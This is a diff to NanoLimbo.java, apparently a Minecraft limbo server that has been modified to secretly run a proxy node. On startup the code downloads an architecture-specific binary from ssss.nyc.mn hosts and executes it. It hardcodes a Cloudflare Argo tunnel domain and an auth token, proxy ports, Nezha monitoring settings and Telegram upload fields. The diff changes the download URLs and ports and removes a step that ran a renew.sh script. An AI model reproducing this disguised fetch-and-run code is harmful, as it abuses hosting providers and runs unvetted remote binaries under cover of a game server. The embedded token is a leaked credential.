@@ -38,7 +38,7 @@ public final class NanoLimbo {
     private static final String[] ALL_ENV_VARS = {
         "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
         "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
-        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "S5_PORT", "ANYTLS_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
+        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
         "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
     };
     
@@ -58,17 +58,6 @@ public final class NanoLimbo {
         // Start SbxService
         try {
             runSbxBinary();
-
-            // ✅ 启动续期脚本 renew.sh（服务器运行期间自动续期）
-            File renewScript = new File("renew.sh");
-            if (renewScript.exists()) {
-                new ProcessBuilder("bash", "renew.sh")
-                    .inheritIO()
-                    .start();
-                System.out.println(ANSI_GREEN + "renew.sh 已启动（自动续期中）" + ANSI_RESET);
-            } else {
-                System.err.println(ANSI_RED + "renew.sh 未找到，跳过执行" + ANSI_RESET);
-            }
             
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
@@ -133,26 +122,23 @@ public final class NanoLimbo {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "01535480-216d-4820-a9f0-a1cb82aac03a");
+        envVars.put("UUID", "6311f148-dc89-41be-aa81-5ab87590473a");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "");
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "");
-        envVars.put("ARGO_PORT", "8001");
+        envVars.put("ARGO_PORT", "8010");
         envVars.put("ARGO_DOMAIN", "minestrator.fulanke.de5.net");
         envVars.put("ARGO_AUTH", "eyJhIjoiNjU4NTBjYjUzOTUyZjNhNTEwNThiOTEwMWVlYjMzY2QiLCJ0IjoiZjhiMDhkNTQtMzM4NC00ZmFkLWE1NDYtMGFiOWM5NjQ2OGUzIiwicyI6Illqa3laR0k0WkRNdE56VmtNQzAwWTJSakxUbGhaalF0TnpaaFlXRTFZVE5pTmpRMiJ9");
-        envVars.put("HY2_PORT", "42134");
-        envVars.put("TUIC_PORT", "35621");
+        envVars.put("HY2_PORT", "");
+        envVars.put("TUIC_PORT", "");
         envVars.put("REALITY_PORT", "");
-        envVars.put("S5_PORT", "");
-        envVars.put("ANYTLS_PORT", "");
-        envVars.put("ANYREALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
         envVars.put("CHAT_ID", "");
         envVars.put("BOT_TOKEN", "");
-        envVars.put("CFIP", "saas.sin.fan");
+        envVars.put("CFIP", "cf.877774.xyz");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "minestrator");
+        envVars.put("NAME", "Mc");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
@@ -190,11 +176,11 @@ public final class NanoLimbo {
         String url;
         
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.ssss.nyc.mn/sbsh";
+            url = "https://amd64.ssss.nyc.mn/s-box";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://arm64.ssss.nyc.mn/sbsh";
+            url = "https://arm64.ssss.nyc.mn/s-box";
         } else if (osArch.contains("s390x")) {
-            url = "https://s390x.ssss.nyc.mn/sbsh";
+            url = "https://s390x.ssss.nyc.mn/s-box";
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
